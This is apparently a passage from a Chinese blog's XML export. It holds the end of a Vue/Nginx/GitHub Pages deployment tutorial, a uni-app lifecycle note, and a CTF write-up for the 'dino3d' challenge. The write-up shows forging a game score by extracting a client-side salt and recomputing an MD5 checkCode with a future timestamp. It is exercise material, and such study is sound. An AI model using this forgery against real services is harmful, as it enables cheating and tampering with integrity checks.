而因为你的项目满足第一条，所以你的项目自动重定向到了你指定的某个具体路由页面，比如：<code>http://localhost:8088/home</code></p><p>如果你按照上述方式访问，这个时候为第一次访问，是没有任何问题的，js 正常加载，页面正常显示。一旦当你刷新之后，访问地址就变成了 <code>http://localhost:8088/home</code></p><p>这是什么地址？浏览器会认为 <code>/home</code> 是一个后端路由地址将其携带到后端服务器：” 嘿哥们，你这儿有这样一个路由地址吗？“，然而后端实际上没有这样一个路由能匹配，于是就造成了 <code>404 not found</code> 的结果。</p><p>那为什么别人做的网站 / 项目不会这样呢？当然是因为别人已经配置过了，没有经过正确配置之前，人人都一样的。</p><p>那是不是 Hash 哈希模式就可以呢？是的，hash 模式可以解决这个问题。</p><p>这是因为设置为 hash 模式后，如果有 <code>http://your.domain.com/#/homepage</code> 这样一个地址，那么其中的<code>#/homepage</code> 就是 <code>hash</code> 值，<code>hash</code> 值只在客户端（如浏览器）中使用，是不会带给服务器的，所以使用 <code>hash</code> 模式时，不存在刷新 <code>404</code> 问题。</p><h2 id="怎么使用-history-模式"><a class="markdownIt-Anchor" href="#怎么使用-history-模式"></a> 怎么使用 history 模式</h2><p>我不想出现 404 错误，我也不想使用 Hash 模式，我该怎么使用 <code>history</code> 模式来让网站变得更优雅呢？</p><p>思路：让服务器那边在收到未配置的 <code>GET</code> 路由时，都返回 <code>index.html</code> 即可。</p><p>什么意思呢？如果浏览器将这样一个后端不认识的路由真的带给了服务器，那么服务器就把 <code>index.html</code> 塞回去，<code>index.html</code> 回去了意味着它所引入的 js 就工作了，js 工作了那么前端路由就活过来了，于是就可以正确处理路由地址了，<code>404 not found</code> 问题也就迎刃而解了。</p><p>这也是为什么某些文章中使用 <a href="https://nginx.org/">Nginx</a> 配置里有 <code>try_files $uri $uri/ /index.html;</code> 存在了。</p><p>换句话说，如果你是<strong>本地部署</strong><a id="history">使用 Nginx</a>，它可以解决你的刷新 404 问题，并且，Nginx 也能解决打包后 <code>proxy</code> 失效带来的请求问题，配置 <code>conf/nginx.conf</code> 如下：</p><ul><li>请注意 Nginx 的根目录最好<strong>不要是 C 盘</strong>，防止权限不足 </li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">http {</span><br><span class="line">...略...</span><br><span class="line"></span><br><span class="line">server {</span><br><span class="line">...略...</span><br><span class="line"></span><br><span class="line">    # 配置Nginx监听的项目根地址</span><br><span class="line">    location / {</span><br><span class="line">        try_files $uri $uri/ /index.html;</span><br><span class="line">        # Vue3项目的打包目录</span><br><span class="line">        root D:/your/own/dist;</span><br><span class="line">        index index.html; # 默认首页文件名</span><br><span class="line">    }</span><br><span class="line">    # 配置请求转发</span><br><span class="line">    location /dev/ {</span><br><span class="line">    # 配置请求监听到之后的转发目标</span><br><span class="line">    proxy_pass http://your.domain.com</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><blockquote><p>相关链接：<a href="https://nginx.org/en/download.html">Nginx 下载</a></p></blockquote><h3 id="github-pages-上的-history-路由模式可行性"><a class="markdownIt-Anchor" href="#github-pages-上的-history-路由模式可行性"></a> GitHub Pages 上的 history 路由模式可行性</h3><h3 id="我的看法"><a class="markdownIt-Anchor" href="#我的看法"></a> 我的看法</h3><p>相信看过上面你已经想到了：我能不能对部署在 GItHub 上的 demo 也这样配置？</p><p>我只能说，我没试过，但我觉得不行：<strong>因为 Nginx 和 demo 不在同一个系统环境</strong>。</p><p>上述配置能成的根本原因是：在前端将路由也带来的情况下，Nginx 进行监听并匹配成功，然后将 <code>index.html</code> 进行返回。</p><p>这里的重点在于，Nginx <strong>要能成功监听</strong>到项目的根地址，但对于部署到 GitHub 上的 demo 来说，浏览器会直接向 GitHub Pages 请求资源，而 GitHub Pages 只支持静态文件托管，它是<strong>没有针对 <code>history</code> 模式的服务端配置</strong>的。</p><p>而且，我总不可能将 Nginx 也部署到 GitHub 上吧？</p><h3 id="一个可能的方法"><a class="markdownIt-Anchor" href="#一个可能的方法"></a> 一个可能的方法</h3><p>不过，ChatGPT 有一个它的解决办法：在 <code>dist</code> 打包<strong>目录内</strong>中加入一个 <code>404.html</code> 页面用于手动返回 <code>index.html</code></p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 如果页面找不到路径，重定向到index.html，让Vue处理</span></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> redirect = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">pathname</span>;</span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">"/index.html?redirect="</span> + redirect;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>我无法验证该方法的可行性，因为我已经将我的 <code>pages</code> 给我生成的域名用来部署了 <code>hexo</code> 博客，我的所有其他仓库的 <code>pages</code> 项目都是在该域名下，这导致我的 demo 无法使用该方法，我也就无法验证了。</p><blockquote><p>相关链接：<a href="https://runoneall.github.io/%E9%80%9A%E8%BF%87Github-Pages-Hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E6%95%99%E7%A8%8B.html">GitHub Pages 部署 hexo 静态博客</a> -<a href="https://github.com/fluid-dev/hexo-theme-fluid">Fluid</a> 主题</p><p>我参考的那篇文章找不到了……</p></blockquote><h3 id="一个可能需要的配置参考"><a class="markdownIt-Anchor" href="#一个可能需要的配置参考"></a> 一个可能需要的配置参考</h3><p>别忘了给你的 <code>Nginx</code> 服务器加上 <code>ssl监听</code>并正确转发请求（<a href="https://www.runoob.com/w3cnote/https-ssl-intro.html">什么是 ssl 证书？</a>），因为 GItHub 的网络环境是 https 的，如果你发送 http 请求，浏览器将会进行拦截。</p><blockquote><p>可自行搜索需要的免费 ssl 证书签发厂家，如果你的远程服务器没有域名，那么你需要的 ssl 证书为 ip 证书，我使用的正是这种类型，可以搜索：<a href="https://cn.bing.com/search?q=zerossl">zerossl</a></p></blockquote><p>我的 <code>Nginx</code> 配置示例如下：</p><figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#user  nobody;</span><br><span class="line">worker_processes  4;</span><br><span class="line"></span><br><span class="line">#error_log  logs/error.log;</span><br><span class="line">#error_log  logs/error.log  notice;</span><br><span class="line">#error_log  logs/error.log  info;</span><br><span class="line"></span><br><span class="line">#pid        logs/nginx.pid;</span><br><span class="line"></span><br><span class="line">events {</span><br><span class="line">    worker_connections  1024;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">http {</span><br><span class="line">    # 监听 HTTP 请求并重定向到 HTTPS</span><br><span class="line">    server {</span><br><span class="line">        listen 80;  # 监听 HTTP</span><br><span class="line">        server_name your_domain;  # 替换为你的域名或 IP</span><br><span class="line"></span><br><span class="line">        # 强制 HTTP 到 HTTPS 重定向</span><br><span class="line">        return 301 https://$host$request_uri;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    # 监听 HTTPS 请求</span><br><span class="line">    server {</span><br><span class="line">        listen 443 ssl;  # 监听 HTTPS</span><br><span class="line">        server_name your_domain;  # 替换为你的域名或 IP</span><br><span class="line"></span><br><span class="line">        ssl_certificate C:/ssl/certificate.crt;  # SSL 证书路径</span><br><span class="line">        ssl_certificate_key C:/ssl/private.key;  # SSL 私钥路径</span><br><span class="line"></span><br><span class="line">        ssl_protocols TLSv1.2 TLSv1.3;  # 启用的 SSL 协议</span><br><span class="line">        ssl_ciphers HIGH:!aNULL:!MD5;  # 启用的加密算法</span><br><span class="line"></span><br><span class="line">        location / {</span><br><span class="line">            root C:/my/test;  # 指定网站根目录</span><br><span class="line">            index flag.txt;  # 默认主页文件</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        location /api {</span><br><span class="line">            proxy_pass http://localhost:1337;  # 代理到 Strapi</span><br><span class="line">            proxy_http_version 1.1;  # 使用 HTTP/1.1</span><br><span class="line">            proxy_set_header Upgrade $http_upgrade;  # 处理 WebSocket</span><br><span class="line">            proxy_set_header Connection 'upgrade';  # 处理 WebSocket</span><br><span class="line">            proxy_set_header Host $host;  # 传递主机头</span><br><span class="line">            proxy_set_header X-Real-IP $remote_addr;  # 传递客户端真实 IP</span><br><span class="line">            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;  # 传递转发 IP</span><br><span class="line">            proxy_set_header X-Forwarded-Proto $scheme;  # 传递原始协议</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        location /upload {</span><br><span class="line">            proxy_pass http://localhost:1337;  # 代理到 Strapi</span><br><span class="line">            proxy_http_version 1.1;  # 使用 HTTP/1.1</span><br><span class="line">            proxy_set_header Upgrade $http_upgrade;  # 处理 WebSocket</span><br><span class="line">            proxy_set_header Connection 'upgrade';  # 处理 WebSocket</span><br><span class="line">            proxy_set_header Host $host;  # 传递主机头</span><br><span class="line">            proxy_set_header X-Real-IP $remote_addr;  # 传递客户端真实 IP</span><br><span class="line">            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;  # 传递转发 IP</span><br><span class="line">            proxy_set_header X-Forwarded-Proto $scheme;  # 传递原始协议</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        # 其他 location 配置...</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>我的 demo 使用的数据来自 <a href="https://strapi.nodejs.cn/dev-docs/quick-start">Strapi</a>（<a href="https://zhuanlan.zhihu.com/p/671975325">什么是 Strapi？</a>），我将该无头 CMS 部署到了和 Nginx 同一系统环境之下，于是有了上述配置。</p><h2 id="部署到-github-pages"><a class="markdownIt-Anchor" href="#部署到-github-pages"></a> 部署到 GitHub Pages</h2><h3 id="可选配置"><a class="markdownIt-Anchor" href="#可选配置"></a> 可选配置</h3><p>终于到了激动人心的部署时刻，在打包之前请根据上文做好自己项目的配置，除此之外还有一个配置对于 vite 打包的项目<strong>可选</strong>：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vite.config.js</span></span><br><span class="line"><span class="attr">build</span>: {</span><br><span class="line">  <span class="attr">rollupOptions</span>: {</span><br><span class="line">    <span class="attr">output</span>: {</span><br><span class="line">      <span class="attr">entryFileNames</span>: <span class="string">'js/[name]-[hash].js'</span>, <span class="comment">// 指定 JS 文件的输出路径及命名规则</span></span><br><span class="line">      <span class="attr">chunkFileNames</span>: <span class="string">'js/[name]-[hash].js'</span>, <span class="comment">// 指定分片文件的输出路径及命名规则</span></span><br><span class="line">      <span class="attr">assetFileNames</span>: <span class="function">(<span class="params">assetInfo</span>) =&gt;</span> {</span><br><span class="line">        <span class="comment">// 设置不同类型文件的输出路径及命名规则</span></span><br><span class="line">        <span class="keyword">if</span> (assetInfo.<span class="property">type</span> === <span class="string">'asset'</span> &amp;&amp; <span class="regexp">/\.(jpe?g|png|gif|svg)$/i</span>.<span class="title function_">test</span>(assetInfo.<span class="property">name</span>)) {</span><br><span class="line">          <span class="keyword">return</span> <span class="string">'img/[name].[hash].[ext]'</span> <span class="comment">// 图像文件输出路径及命名规则</span></span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span> (assetInfo.<span class="property">type</span> === <span class="string">'asset'</span> &amp;&amp; <span class="regexp">/\.(ttf|woff|woff2|eot)$/i</span>.<span class="title function_">test</span>(assetInfo.<span class="property">name</span>)) {</span><br><span class="line">          <span class="keyword">return</span> <span class="string">'fonts/[name].[hash].[ext]'</span> <span class="comment">// 字体文件输出路径及命名规则</span></span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'[ext]/name1-[hash].[ext]'</span> <span class="comment">// 其他资源文件输出路径及命名规则</span></span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>添加上述 <code>build</code> 配置项，将会将打包后的 dist 目录按类型分 <code>css</code>、<code>js</code>、<code>img</code> 文件夹。当然<strong>只是可选，非必须</strong>。</p><blockquote><p>配置项参考文章：<a href="https://blog.csdn.net/qq_33522195/article/details/137021366">vue 项目配置 vite 打包输出文件夹（css，img，js，font）</a></p></blockquote><h3 id="github-部署"><a class="markdownIt-Anchor" href="#github-部署"></a> Github 部署</h3><p>好了，请将项目 <code>build</code> 打包为一个 <code>dist</code> 文件夹。然后按照以下步骤进行部署：</p><ol><li><p>转到 <a href="https://github.com/">GitHub</a> 创建一个新的仓库（已有仓库跳第二步），填写 <code>Repository name</code> 仓库名并将仓库设为 <code>Public</code> 公开就可以了，其他不用设置，点击 <code>Create repository</code> 创建仓库即可。</p></li><li><p>复制仓库的 ssh 链接（<a href="https://www.cnblogs.com/lezaizhu/p/13836164.html">我没有用过 git 进行远程仓库绑定</a>），例如：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git@github.com:yourUserName/article-management-admin.git</span><br></pre></td></tr></tbody></table></figure></li><li><p>找到本地刚新鲜打包的 <code>dist</code> 文件夹，进入文件夹中，目录结构应该为：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># vue-cli 打包结果</span><br><span class="line">├─css</span><br><span class="line">├─img</span><br><span class="line">├─js</span><br><span class="line">├─.nojekyll</span><br><span class="line">├─favicon.ico</span><br><span class="line">└─index.html</span><br><span class="line"></span><br><span class="line"># vite 打包结果</span><br><span class="line">├─asset</span><br><span class="line">├─favicon.ico</span><br><span class="line">└─index.html</span><br></pre></td></tr></tbody></table></figure></li><li><p>在 <code>dist</code><strong>文件夹内</strong>，执行 git 仓库初始化</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></tbody></table></figure></li><li><p>添加所有文件到暂存区，并执行 <code>commit</code> 提交<br>注：<code>vite</code> 打包的项目可能会存在以<code>_</code>下划线开头的 <code>js</code> 文件，而 <code>GitHub Pages</code> 可能忽略该文件，导致项目 demo 无法找到文件报 404 错误，请检查你的 dist 文件夹下的 asset 目录中是否存在上述文件。如果确实存在，请在 <code>dist</code> 目录下创建一个空文件以禁用 GitHub Pages 的 Jekyll 默认处理行为，文件名为：<code>.nojekyll</code><br>参考文章：<a href="https://www.cnblogs.com/deajax/p/12430884.html">github pages 不能识别下划线开头的文件</a></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">"-Write down your message here."</span></span><br></pre></td></tr></tbody></table></figure></li><li><p>绑定远程仓库</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote add origin &lt;remote-url&gt;</span><br></pre></td></tr></tbody></table></figure></li><li><p>你可以将该分支（我的默认初始化分支为 main）先 push 推送出去，已有仓库的可以跳到 8</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push -u origin main</span><br></pre></td></tr></tbody></table></figure></li><li><p>创建孤立的空分支 <code>gh-pages</code> 用于推送</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout --orphan gh-pages</span><br></pre></td></tr></tbody></table></figure></li><li><p>推送代码到 <code>gh-pages</code> 分支用于部署静态页面</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push -u origin gh-pages</span><br></pre></td></tr></tbody></table></figure></li><li><p>转到 GitHub 仓库页，请切换仓库分支为 <code>gh-pages</code> 并等待 <code>GitHub</code> 的 <code>check</code> 操作：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202410110255530.png" alt="image-20241011025535410"></p></li><li><p>GitHub 的 check 操作完成后，点击仓库 <code>Settings</code> 设置项，然后在左侧侧边栏选择 <code>Pages</code>，点击构建好的链接或者右边的 <code>Visit site</code> 即可。<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202410110259820.png" alt="image-20241011025932731"></p></li></ol><p>小白篇到此，完结撒花 🎉🎉🎉</p><p>有更多需求可以自行探索，相信你已经入门了。</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF X CBCTF 2022 九月挑战赛 dino3d</title>
      <link href="/posts/29897.html"/>
      <url>/posts/29897.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><blockquote><p>题目链接：<a href="https://buuoj.cn/match/matches/151/challenges">https://buuoj.cn/match/matches/151/challenges</a></p></blockquote><p>启动环境之后，玩一会，进行抓包：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/image-20221104203141388-1667565104615-1.png" alt="1"></p><p>得到 score 分数和 checkcode，因为要玩到 1000000 分，所以直接修改分数 score 为目标分数发出看看：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/image-20221104203423402-1667565266070-3.png" alt="2"></p><p>看来行不通，可能还要<strong>伪造 checkcode 和 tm 时间戳</strong>。</p><p>f12 查看 js 代码，ctrl+f 搜索 checkcode，找到定义：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/image-20221104203851364-1667565535786-5.png" alt="3"></p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> checkCode = <span class="string">"DASxCBCTF"</span> + salt;</span><br></pre></td></tr></tbody></table></figure><p>这里这个 salt 并不知道是什么，还需要查看代码分析。</p><p>知道定义之后，再查看另外两个搜索结果：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/image-20221104204137072-1667565698310-7.png" alt="4"></p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/image-20221104204157356-1667565718617-9.png" alt="5"></p><p>判断关键信息：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">body</span>: <span class="string">"score="</span> +</span><br><span class="line">  <span class="built_in">parseInt</span>(e).<span class="title function_">toString</span>() +</span><br><span class="line">  <span class="string">"&amp;checkCode="</span> +</span><br><span class="line">  <span class="title function_">md5</span>(<span class="built_in">parseInt</span>(e).<span class="title function_">toString</span>() + t) +</span><br><span class="line">  <span class="string">"&amp;tm="</span> +</span><br><span class="line">  (+<span class="keyword">new</span> <span class="title class_">Date</span>()).<span class="title function_">toString</span>().<span class="title function_">substring</span>(<span class="number">0</span>, <span class="number">10</span>);</span><br></pre></td></tr></tbody></table></figure><p>根据抓包结果，我们知道数据格式是：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">score=xxx&amp;checkCode=xxx&amp;tm=xxx</span><br></pre></td></tr></tbody></table></figure><p>所以可以判定这里的 e 是分数，那么这个 md5 () 函数里面的 <strong>t</strong> 又是什么？</p><p>到这里就进展不下去了，只能再去找找这个 <strong>salt</strong>，因为根据定义（或者说赋值语句）中的 checkcode = "xxx"+salt 来看，这个 salt 可能就是 t</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/image-20221104204811600-1667566092580-11.png" alt="image-20221104204811600-1667566092580-11"></p><p>搜索 salt 发现赋值语句：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> salt = <span class="string">"_wElc03e"</span>;</span><br></pre></td></tr></tbody></table></figure><p>此外并未搜索到其他新的跟 salt 有关的语句了。</p><p>那么我们就要验证一下这个 t 是不是就是 salt 了。验证的方法也很简单，直接 md5 (分数 + salt) 然后跟我们抓包的结果进行比对即可。</p><p>抓包结果：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">score=150</span><br><span class="line">checkCode=c652f21617f6592c3918c8aa7aa85502</span><br></pre></td></tr></tbody></table></figure><p>md5 加密结果：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">150DASxCBCTF_wElc03e</span><br><span class="line"></span><br><span class="line">md5_after:c652f21617f6592c3918c8aa7aa85502</span><br></pre></td></tr></tbody></table></figure><p>拼接加密结果和抓包结果的 checkcode 相同。这样就能伪造 checkcode 了</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checkcode=md5(score+DASxCBCTF+_wElc03e)</span><br></pre></td></tr></tbody></table></figure><p>由于我们要达到目标分才能拿到 flag，那么先直接将目标 checkcode 写出</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag_checkcode: 4639d0ab43e9030749f450eb6e9fbb97</span><br></pre></td></tr></tbody></table></figure><p>score</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag_score: 1000000</span><br></pre></td></tr></tbody></table></figure><p>时间戳的话，直接通过在线网站查询然后写一个未来时间的值，等到了那个值同一时间将包发出即可。（考虑网络延迟，可能要稍微快一点点将包发出）</p><p>时间戳转换网址：<a href="https://shijianchuo.net/">https://shijianchuo.net/</a></p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/image-20221104211441095-1667567683413-13.png" alt="13"></p><p>返回查看就能得到 flag 了</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>uni-app 涉及到的生命周期小结</title>
      <link href="/posts/7498.html"/>
      <url>/posts/7498.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><h2 id="uniapp-常见的页面生命周期"><a class="markdownIt-Anchor" href="#uniapp-常见的页面生命周期"></a> UniApp 常见的页面生命周期</h2><h3 id="1-onloadoptions"><a class="markdownIt-Anchor" href="#1-onloadoptions"></a> 1、onLoad(options)</h3><ul><li>页面加载时触发。</li><li>常用于初始化页面数据，从页面 URL 的参数 <code>options</code> 获取数据。</li><li>只在页面首次加载时触发一次。</li></ul><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">onLoad</span>(<span class="params">options</span>) {</span><br><span class="line">  <span class="comment">// 可以从options中拿到url查询参数</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">'页面加载'</span>, options);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="2-onshow"><a class="markdownIt-Anchor" href="#2-onshow"></a> 2、onShow()</h3><ul><li>页面显示时触发，可能在页面首次加载后，也可能在页面重新显示时（如从后台切回前台）。</li><li>常用于刷新页面数据或 UI 状态。</li></ul><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">onShow</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">'页面显示'</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="3-onready"><a class="markdownIt-Anchor" href="#3-onready"></a> 3、onReady()</h3><ul><li>页面初次渲染完成时触发，只触发一次。</li><li>页面结构加载和绘制完成后触发，可以在此进行与 UI 相关的操作。</li></ul><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">onReady</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">'页面初次渲染完成'</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="4-onhide"><a class="markdownIt-Anchor" href="#4-onhide"></a> 4、onHide()</h3><ul><li>页面被隐藏时触发，比如跳转到其他页面或应用切换到后台时。</li><li>常用于暂停页面中的定时器或动画。</li></ul><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">onHide</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">'页面隐藏'</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="5-onunload"><a class="markdownIt-Anchor" href="#5-onunload"></a> 5、onUnload()</h3><ul><li>页面卸载（离开）时触发，常用于清理资源（如关闭网络请求或销毁定时器）。</li></ul><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">onUnload</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">'页面卸载'</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="6-onpulldownrefresh"><a class="markdownIt-Anchor" href="#6-onpulldownrefresh"></a> 6、onPullDownRefresh()</h3><ul><li>监听用户下拉动作的事件处理函数。</li><li>需要在 <code>pages.json</code> 中启用页面的下拉刷新功能。</li></ul><figure class="highlight json"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span 